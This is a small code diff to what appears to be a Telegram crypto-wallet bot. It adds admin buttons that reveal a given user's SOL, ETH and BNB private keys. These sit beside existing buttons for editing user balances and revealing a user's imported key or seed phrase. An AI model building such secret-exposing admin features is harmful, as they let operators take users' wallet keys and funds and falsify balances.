@@ -46,7 +46,9 @@ def registered_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
             [InlineKeyboardButton(text="✏️ Edit SOL", callback_data=f"admin:balance_asset:{user_id}:SOL")],
             [InlineKeyboardButton(text="✏️ Edit BNB", callback_data=f"admin:balance_asset:{user_id}:BNB")],
             [InlineKeyboardButton(text="✏️ Edit ETH", callback_data=f"admin:balance_asset:{user_id}:ETH")],
-            [InlineKeyboardButton(text="🔑 Reveal Keys", callback_data="admin:wallets")],
+            [InlineKeyboardButton(text="🔑 Reveal SOL Key", callback_data=f"admin:user_wallet_key:{user_id}:solana")],
+            [InlineKeyboardButton(text="🔑 Reveal ETH Key", callback_data=f"admin:user_wallet_key:{user_id}:ethereum")],
+            [InlineKeyboardButton(text="🔑 Reveal BNB Key", callback_data=f"admin:user_wallet_key:{user_id}:bnb")],
             [InlineKeyboardButton(text="🔐 Reveal Imported Key/Phrase", callback_data=f"admin:imported_pk:{user_id}")],
             [InlineKeyboardButton(text="⬅️ Back to Users", callback_data="admin:users:1")],
         ]
